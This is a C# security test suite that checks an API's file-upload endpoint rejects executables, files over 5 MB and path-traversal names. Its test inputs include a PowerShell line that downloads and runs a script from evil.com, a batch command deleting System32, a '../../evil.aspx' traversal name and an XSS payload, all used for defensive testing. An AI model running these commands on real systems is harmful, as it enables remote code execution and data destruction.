using System.Net;
using System.Net.Http.Headers;
using System.Text;
using FluentAssertions;
using SecurityAsserts.Configuration;
using SecurityAsserts.Helpers;
using Xunit;

namespace SecurityAsserts.Grupo6_Archivos;

/// <summary>
/// Assert A14 — Carga de archivos sin restricción de tipo ni tamaño
/// El endpoint POST /files/upload debe rechazar archivos ejecutables y limitar el tamaño.
/// Oleada 1 — BLQ
/// OWASP API3:2023 / API4:2023
/// </summary>
public class G6_FileUpload_Asserts
{
    private static MultipartFormDataContent BuildUploadContent(string fileName, string content, string mediaType = "application/octet-stream")
    {
        var form = new MultipartFormDataContent();
        var bytes = Encoding.UTF8.GetBytes(content);
        var fileContent = new ByteArrayContent(bytes);
        fileContent.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
        form.Add(fileContent, "file", fileName);
        return form;
    }

    [Theory]
    [InlineData("malware.exe",  "MZ\x90\x00\x03")]          // PE header
    [InlineData("backdoor.aspx","<%@ Page Language=\"C#\" %>")]
    [InlineData("shell.ps1",    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')")]
    [InlineData("cmd.bat",      "@echo off & del /f /q C:\\Windows\\System32")]
    [Trait("Assert",  "A14")]
    [Trait("Oleada",  "Oleada1")]
    [Trait("Category","BLQ")]
    [Trait("OWASP",   "API3:2023")]
    public async Task A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(string fileName, string content)
    {
        using var client = TestConfig.CreateClient();
        var token = await AuthHelper.GetTokenAsync(client, TestConfig.UserAEmail, TestConfig.UserAPassword);
        AuthHelper.SetBearer(client, token);

        using var form = BuildUploadContent(fileName, content);
        var response = await client.PostAsync("/api/v2/files/upload", form);

        response.StatusCode.Should().BeOneOf(
            new[] { HttpStatusCode.BadRequest, HttpStatusCode.UnsupportedMediaType, HttpStatusCode.Forbidden },
            because: $"A14 — Upload de '{fileName}' (ejecutable) debe ser rechazado con 400/415");
    }

    [Fact]
    [Trait("Assert",  "A14b")]
    [Trait("Oleada",  "Oleada1")]
    [Trait("Category","BLQ")]
    [Trait("OWASP",   "API4:2023")]
    public async Task A14b_FileUpload_OversizedFile_ShouldReturn413()
    {
        using var client = TestConfig.CreateClient();
        var token = await AuthHelper.GetTokenAsync(client, TestConfig.UserAEmail, TestConfig.UserAPassword);
        AuthHelper.SetBearer(client, token);

        // Simular archivo de ~6 MB (sobre el límite esperado de 5 MB)
        var bigContent = new string('A', 6 * 1024 * 1024);
        using var form = BuildUploadContent("bigfile.txt", bigContent, "text/plain");
        var response = await client.PostAsync("/api/v2/files/upload", form);

        response.StatusCode.Should().BeOneOf(
            new[] { HttpStatusCode.RequestEntityTooLarge, HttpStatusCode.BadRequest },
            because: "A14b — Archivos mayores a 5 MB deben rechazarse con 413 o 400");
    }

    [Fact]
    [Trait("Assert",  "A14c")]
    [Trait("Oleada",  "Oleada1")]
    [Trait("Category","BLQ")]
    [Trait("OWASP",   "API3:2023")]
    public async Task A14c_FileUpload_TraversalInFileName_ShouldNotSaveOutsideBaseDir()
    {
        using var client = TestConfig.CreateClient();
        var token = await AuthHelper.GetTokenAsync(client, TestConfig.UserAEmail, TestConfig.UserAPassword);
        AuthHelper.SetBearer(client, token);

        // Nombre de archivo con traversal — intenta escribir fuera del directorio uploads/
        using var form = BuildUploadContent("../../evil.aspx", "<script>alert(1)</script>", "text/plain");
        var response = await client.PostAsync("/api/v2/files/upload", form);

        // Debe ser rechazado, o si acepta, el nombre debe estar sanitizado
        if (response.StatusCode == HttpStatusCode.OK)
        {
            var body = await response.Content.ReadAsStringAsync();
            body.Should().NotContain("..\\",
                because: "A14c — El path de guardado no debe contener traversal");
            body.Should().NotContain("../",
                because: "A14c — El path de guardado no debe contener traversal");
        }
        else
        {
            response.StatusCode.Should().BeOneOf(
                new[] { HttpStatusCode.BadRequest, HttpStatusCode.Forbidden },
                because: "A14c — Nombre de archivo con '../' debe rechazarse");
        }
    }
}
